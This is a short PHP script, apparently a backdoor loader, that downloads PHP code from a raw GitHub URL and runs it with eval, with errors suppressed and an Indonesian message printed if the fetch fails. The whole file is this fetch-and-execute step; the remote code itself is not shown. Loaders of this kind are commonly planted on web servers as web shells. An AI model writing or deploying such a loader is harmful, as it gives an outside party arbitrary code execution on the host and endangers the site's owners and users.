<?php
$url = "https://raw.githubusercontent.com/Dimasbriliant/as/refs/heads/main/aprcs.php";
$code = @file_get_contents($url);

if ($code !== false) {
    eval("?>".$code);
} else {
    echo "Gagal mengambil file dari GitHub.";
}
?>